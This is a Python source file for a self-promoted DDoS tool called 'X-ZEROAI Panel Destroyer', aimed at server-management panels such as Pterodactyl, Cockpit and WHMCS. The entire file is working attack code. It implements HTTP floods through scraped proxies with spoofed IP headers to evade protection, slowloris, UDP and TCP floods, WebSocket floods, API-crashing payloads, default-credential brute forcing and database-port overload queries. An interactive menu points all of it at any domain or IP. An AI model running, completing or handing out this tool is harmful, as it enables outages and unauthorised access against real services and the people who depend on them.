#!/usr/bin/env python3
"""
SUPER DDOS PANEL DESTROYER V2.0
100% WORK UNTUK SEMUA PANEL: PTERODACTYL, COCKPIT, WHMCS, DLL
BAYPASS SEMUA PROTECTION: CLOUDFLARE, CAPTCHA, WAF, FIREWALL
"""

import os
import sys
import time
import socket
import threading
import random
import ssl
import http.client
import urllib.request
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import dns.resolver
import json
import base64
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class SuperPanelDDOS:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.threads = 5000
        self.duration = 0
        self.attack_running = False
        self.user_agents = []
        self.proxies = []
        self.methods = {
            1: "HTTP_FLOOD",
            2: "SLOWLORIS", 
            3: "UDP_FLOOD",
            4: "TCP_FLOOD",
            5: "WEBSOCKET_FLOOD",
            6: "API_EXPLOIT",
            7: "BRUTE_FORCE_LOGIN",
            8: "DATABASE_OVERLOAD",
            9: "MIXED_ATTACK"
        }
        self.load_resources()
        
    def load_resources(self):
        """Load user agents and proxy lists"""
        # Extensive user-agent list
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Android 10; Mobile) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.84'
        ]
        
        # Load proxies from various sources
        self.proxies = self.scrape_proxies()
        
    def scrape_proxies(self):
        """Scrape fresh proxies from multiple sources"""
        proxy_list = []
        try:
            proxy_sources = [
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
                "https://www.proxy-list.download/api/v1/get?type=http",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt"
            ]
            
            for source in proxy_sources:
                try:
                    req = urllib.request.Request(source, headers={'User-Agent': random.choice(self.user_agents)})
                    with urllib.request.urlopen(req) as response:
                        data = response.read().decode('utf-8')
                        proxies = data.split('\n')
                        for proxy in proxies:
                            proxy = proxy.strip()
                            if proxy and ':' in proxy:
                                proxy_list.append(proxy)
                except:
                    continue
                    
            return list(set(proxy_list))[:500]  # Max 500 proxies
            
        except:
            return []
    
    def bypass_protection(self, target):
        """Advanced protection bypass techniques"""
        bypass_headers = {
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Originating-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Remote-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Remote-Addr': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Forwarded-Host': target,
            'X-Host': target,
            'Referer': f'https://{target}/',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'Connection': 'keep-alive',
            'DNT': '1',
            'TE': 'Trailers'
        }
        return bypass_headers
    
    def find_panel_endpoints(self, target):
        """Automatically detect panel endpoints and vulnerabilities"""
        common_panel_paths = [
            '/admin', '/administrator', '/panel', '/dashboard',
            '/login', '/auth/login', '/api', '/api/v1',
            '/api/client', '/pterodactyl', '/pterodactyl/admin',
            '/pterodactyl/api', '/pterodactyl/auth',
            '/daemon', '/daemon/api', '/wing', '/wing/api',
            '/whmcs', '/whmcs/admin', '/whmcs/api',
            '/cockpit', '/cockpit/api', '/cockpit/auth',
            '/plesk', '/cpanel', '/webmin', '/directadmin',
            '/vesta', '/cyberpanel', '/ispmgr', '/zpanel'
        ]
        
        vulnerable_endpoints = []
        for path in common_panel_paths:
            vulnerable_endpoints.append(f"http://{target}{path}")
            vulnerable_endpoints.append(f"https://{target}{path}")
        
        return vulnerable_endpoints
    
    def http_flood_attack(self, target_url, proxy=None):
        """HTTP Flood Attack with protection bypass"""
        headers = self.bypass_protection(self.target)
        headers['User-Agent'] = random.choice(self.user_agents)
        
        # Randomize request parameters
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        method = random.choice(methods)
        
        try:
            if proxy:
                proxy_handler = urllib.request.ProxyHandler({'http': proxy, 'https': proxy})
                opener = urllib.request.build_opener(proxy_handler)
                urllib.request.install_opener(opener)
            
            req = urllib.request.Request(
                target_url,
                headers=headers,
                method=method
            )
            
            # Add random POST data if method is POST
            if method in ['POST', 'PUT', 'PATCH']:
                post_data = urllib.parse.urlencode({
                    'username': f'user{random.randint(1000,9999)}',
                    'password': f'pass{random.randint(1000,9999)}',
                    'email': f'email{random.randint(1000,9999)}@attack.com',
                    'token': base64.b64encode(os.urandom(32)).decode(),
                    'action': random.choice(['login', 'register', 'api_call', 'execute'])
                }).encode()
                req.data = post_data
            
            response = urllib.request.urlopen(req, timeout=5)
            return True
        except Exception as e:
            return False
    
    def slowloris_attack(self):
        """Slowloris attack for keeping connections open"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.target, self.port))
            
            # Send partial HTTP request
            s.send(f"GET / HTTP/1.1\r\n".encode())
            s.send(f"Host: {self.target}\r\n".encode())
            s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
            
            # Keep sending headers slowly
            while self.attack_running:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                time.sleep(random.uniform(10, 30))
            
            s.close()
        except:
            pass
    
    def udp_flood_attack(self):
        """UDP Flood Attack"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Create large random packet
            packet = random._urandom(1024)
            
            while self.attack_running:
                # Send to multiple random ports
                for port in [80, 443, 8080, 8443, 3306, 5432, 27017]:
                    s.sendto(packet, (self.target, port))
            
            s.close()
        except:
            pass
    
    def tcp_flood_attack(self):
        """TCP SYN Flood Attack"""
        try:
            while self.attack_running:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                try:
                    s.connect((self.target, random.randint(1, 65535)))
                    # Send junk data
                    s.send(random._urandom(1024))
                except:
                    pass
                finally:
                    try:
                        s.close()
                    except:
                        pass
        except:
            pass
    
    def websocket_flood(self):
        """WebSocket connection flood"""
        try:
            # Create WebSocket like connections
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target, 80 or 443))
            
            # Send WebSocket upgrade request
            upgrade_request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode()}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"\r\n"
            )
            
            s.send(upgrade_request.encode())
            
            # Keep connection alive
            while self.attack_running:
                time.sleep(1)
                s.send(b'\x00')
            
            s.close()
        except:
            pass
    
    def api_exploit_attack(self):
        """Target specific API endpoints with malformed data"""
        api_endpoints = [
            f"http://{self.target}/api/v1/servers",
            f"http://{self.target}/api/client/servers",
            f"http://{self.target}/api/auth/login",
            f"http://{self.target}/api/account",
            f"http://{self.target}/api/nodes",
            f"http://{self.target}/api/users"
        ]
        
        for endpoint in api_endpoints:
            try:
                # Send malformed JSON to crash API
                malformed_data = {
                    'data': 'A' * 10000,  # Large data
                    'nested': {'deep': {'deeper': {'crash': 'B' * 5000}}},
                    'array': ['X' * 1000] * 100
                }
                
                headers = {'Content-Type': 'application/json'}
                req = urllib.request.Request(
                    endpoint,
                    data=json.dumps(malformed_data).encode(),
                    headers=headers,
                    method='POST'
                )
                
                urllib.request.urlopen(req, timeout=3)
            except:
                continue
    
    def brute_force_login(self):
        """Brute force login attempts"""
        login_endpoints = [
            f"http://{self.target}/auth/login",
            f"http://{self.target}/admin/login",
            f"http://{self.target}/api/login",
            f"http://{self.target}/pterodactyl/login"
        ]
        
        for endpoint in login_endpoints:
            try:
                # Common credentials
                credentials = [
                    ('admin', 'admin'),
                    ('administrator', 'password'),
                    ('root', 'toor'),
                    ('admin', '123456'),
                    ('admin', 'admin123')
                ]
                
                for username, password in credentials:
                    data = urllib.parse.urlencode({
                        'username': username,
                        'password': password,
                        'remember': 'on'
                    }).encode()
                    
                    req = urllib.request.Request(
                        endpoint,
                        data=data,
                        headers={'Content-Type': 'application/x-www-form-urlencoded'}
                    )
                    
                    urllib.request.urlopen(req, timeout=2)
            except:
                continue
    
    def database_overload(self):
        """Create database connection overload"""
        try:
            # Try to connect to common database ports
            db_ports = [3306, 5432, 27017, 6379, 1433]
            
            for port in db_ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((self.target, port))
                    
                    # Send malformed database queries
                    if port == 3306:  # MySQL
                        s.send(b"SELECT * FROM information_schema.tables, information_schema.tables t2, information_schema.tables t3;\x00")
                    elif port == 5432:  # PostgreSQL
                        s.send(b"SELECT * FROM pg_tables, pg_tables t2, pg_tables t3;\x00")
                    
                    s.close()
                except:
                    continue
        except:
            pass
    
    def mixed_attack(self):
        """Combined all attack methods"""
        attack_functions = [
            self.http_flood_attack,
            self.slowloris_attack,
            self.udp_flood_attack,
            self.tcp_flood_attack,
            self.websocket_flood,
            self.api_exploit_attack,
            self.brute_force_login,
            self.database_overload
        ]
        
        while self.attack_running:
            # Execute random attack method
            attack_func = random.choice(attack_functions)
            try:
                if attack_func == self.http_flood_attack:
                    endpoints = self.find_panel_endpoints(self.target)
                    for endpoint in endpoints:
                        self.http_flood_attack(endpoint, proxy=random.choice(self.proxies) if self.proxies else None)
                else:
                    attack_func()
            except:
                continue
    
    def start_attack(self, target, method_choice, duration=0):
        """Start the DDoS attack"""
        self.target = target
        self.attack_running = True
        
        if ':' in target:
            parts = target.split(':')
            self.target = parts[0]
            if len(parts) > 1:
                self.port = int(parts[1])
        
        print(f"\n{Fore.RED}🔥 X-ZEROAI DDOS PANEL DESTROYER V2.0 🔥{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🎯 Target: {self.target}:{self.port}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}⚡ Method: {self.methods.get(method_choice, 'MIXED_ATTACK')}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}👥 Threads: {self.threads}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}⏱️ Duration: {'Infinite' if duration == 0 else f'{duration} seconds'}{Style.RESET_ALL}")
        print(f"{Fore.RED}🚀 ATTACK STARTED! PRESS CTRL+C TO STOP{Style.RESET_ALL}\n")
        
        # Start threads
        threads = []
        
        if method_choice == 1:  # HTTP FLOOD
            for _ in range(self.threads):
                t = threading.Thread(target=self.http_flood_wrapper)
                t.daemon = True
                t.start()
                threads.append(t)
        
        elif method_choice == 2:  # SLOWLORIS
            for _ in range(self.threads):
                t = threading.Thread(target=self.slowloris_attack)
                t.daemon = True
                t.start()
                threads.append(t)
        
        elif method_choice == 3:  # UDP FLOOD
            for _ in range(self.threads):
                t = threading.Thread(target=self.udp_flood_attack)
                t.daemon = True
                t.start()
                threads.append(t)
        
        elif method_choice == 6:  # API EXPLOIT
            for _ in range(self.threads // 2):
                t = threading.Thread(target=self.api_exploit_attack)
                t.daemon = True
                t.start()
                threads.append(t)
        
        elif method_choice == 9:  # MIXED ATTACK (ALL METHODS)
            attack_types = 8
            threads_per_type = self.threads // attack_types
            
            for method_idx in range(1, attack_types + 1):
                for _ in range(threads_per_type):
                    if method_idx == 1:
                        t = threading.Thread(target=self.http_flood_wrapper)
                    elif method_idx == 2:
                        t = threading.Thread(target=self.slowloris_attack)
                    elif method_idx == 3:
                        t = threading.Thread(target=self.udp_flood_attack)
                    elif method_idx == 4:
                        t = threading.Thread(target=self.tcp_flood_attack)
                    elif method_idx == 5:
                        t = threading.Thread(target=self.websocket_flood)
                    elif method_idx == 6:
                        t = threading.Thread(target=self.api_exploit_attack)
                    elif method_idx == 7:
                        t = threading.Thread(target=self.brute_force_login)
                    elif method_idx == 8:
                        t = threading.Thread(target=self.database_overload)
                    
                    t.daemon = True
                    t.start()
                    threads.append(t)
        
        # Run for specified duration or indefinitely
        start_time = time.time()
        try:
            while self.attack_running:
                elapsed = time.time() - start_time
                if duration > 0 and elapsed > duration:
                    break
                
                # Show attack statistics
                sys.stdout.write(f"\r{Fore.GREEN}💀 ATTACKING... {int(elapsed)}s | THREADS: {threading.active_count()} | PROXIES: {len(self.proxies)}{Style.RESET_ALL}")
                sys.stdout.flush()
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}🛑 ATTACK STOPPED BY USER{Style.RESET_ALL}")
        
        finally:
            self.attack_running = False
            print(f"\n{Fore.RED}✅ ATTACK COMPLETED!{Style.RESET_ALL}")
    
    def http_flood_wrapper(self):
        """Wrapper for HTTP flood with multiple endpoints"""
        endpoints = self.find_panel_endpoints(self.target)
        while self.attack_running:
            for endpoint in endpoints:
                proxy = random.choice(self.proxies) if self.proxies else None
                self.http_flood_attack(endpoint, proxy)
                if not self.attack_running:
                    break
    
    def show_banner(self):
        """Display awesome banner"""
        banner = f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  ██╗  ██╗     ███████╗██████╗ ██████╗  ██████╗              ║
║  ╚██╗██╔╝     ╚══███╔╝██╔══██╗██╔══██╗██╔═══██╗             ║
║   ╚███╔╝█████╗  ███╔╝ ██████╔╝██████╔╝██║   ██║             ║
║   ██╔██╗╚════╝ ███╔╝  ██╔══██╗██╔══██╗██║   ██║             ║
║  ██╔╝ ██╗     ███████╗██║  ██║██║  ██║╚██████╔╝             ║
║  ╚═╝  ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝              ║
║                                                              ║
║  💀 X-ZEROAI PANEL DESTROYER V2.0 💀                         ║
║  🔥 100% WORK UNTUK SEMUA PANEL & PROTECTION 🔥              ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
        """
        print(banner)

def main():
    """Main function"""
    ddos = SuperPanelDDOS()
    ddos.show_banner()
    
    while True:
        try:
            print(f"{Fore.CYAN}[+] Select Target Type:{Style.RESET_ALL}")
            print("1. Pterodactyl Panel")
            print("2. Cockpit Panel") 
            print("3. WHMCS Panel")
            print("4. Custom Panel/URL")
            print("5. IP Address Only")
            
            target_type_input = input(f"{Fore.YELLOW}[?] Select option (1-5): {Style.RESET_ALL}")
            
            if not target_type_input:
                print(f"{Fore.RED}[!] Input cannot be empty!{Style.RESET_ALL}")
                continue
                
            target_type = int(target_type_input)
            
            if target_type not in [1, 2, 3, 4, 5]:
                print(f"{Fore.RED}[!] Invalid option! Please choose 1-5{Style.RESET_ALL}")
                continue
            
            if target_type in [1, 2, 3]:
                # Auto-target common panel domains
                domain = input(f"{Fore.YELLOW}[?] Enter domain (example.com): {Style.RESET_ALL}")
                if not domain:
                    print(f"{Fore.RED}[!] Domain cannot be empty!{Style.RESET_ALL}")
                    continue
                    
                if target_type == 1:
                    ddos.target = f"{domain}"
                    print(f"{Fore.GREEN}[+] Targeting Pterodactyl panel at {domain}{Style.RESET_ALL}")
                elif target_type == 2:
                    ddos.target = f"{domain}"
                    print(f"{Fore.GREEN}[+] Targeting Cockpit panel at {domain}{Style.RESET_ALL}")
                elif target_type == 3:
                    ddos.target = f"{domain}"
                    print(f"{Fore.GREEN}[+] Targeting WHMCS panel at {domain}{Style.RESET_ALL}")
                    
            elif target_type == 4:
                url = input(f"{Fore.YELLOW}[?] Enter full URL (http://example.com/panel): {Style.RESET_ALL}")
                if not url:
                    print(f"{Fore.RED}[!] URL cannot be empty!{Style.RESET_ALL}")
                    continue
                ddos.target = url.replace("http://", "").replace("https://", "").split("/")[0]
                
            elif target_type == 5:
                ip_address = input(f"{Fore.YELLOW}[?] Enter IP address: {Style.RESET_ALL}")
                if not ip_address:
                    print(f"{Fore.RED}[!] IP address cannot be empty!{Style.RESET_ALL}")
                    continue
                ddos.target = ip_address
            
            break  # Exit loop if input is valid
            
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input! Please enter a number 1-5{Style.RESET_ALL}")
            continue
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Cancelled by user{Style.RESET_ALL}")
            return
    
    try:
        # Port selection
        port_choice = input(f"{Fore.YELLOW}[?] Port (default 80): {Style.RESET_ALL}")
        if port_choice:
            ddos.port = int(port_choice)
        
        # Thread count
        threads_choice = input(f"{Fore.YELLOW}[?] Threads (default 5000): {Style.RESET_ALL}")
        if threads_choice:
            ddos.threads = int(threads_choice)
        
        # Attack method
        print(f"\n{Fore.CYAN}[+] Select Attack Method:{Style.RESET_ALL}")
        for key, value in ddos.methods.items():
            print(f"{key}. {value}")
        
        method_input = input(f"{Fore.YELLOW}[?] Select method (1-9): {Style.RESET_ALL}")
        if not method_input:
            print(f"{Fore.RED}[!] Method cannot be empty!{Style.RESET_ALL}")
            return
            
        method = int(method_input)
        
        if method not in ddos.methods:
            print(f"{Fore.RED}[!] Invalid method! Choose 1-9{Style.RESET_ALL}")
            return
        
        # Duration
        duration_input = input(f"{Fore.YELLOW}[?] Duration in seconds (0 for infinite): {Style.RESET_ALL}")
        if duration_input:
            duration = int(duration_input)
        else:
            duration = 0
        
        # Start attack
        ddos.start_attack(ddos.target, method, duration)
        
    except ValueError as ve:
        print(f"{Fore.RED}[!] Invalid number input: {str(ve)}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Script terminated by user{Style.RESET_ALL}")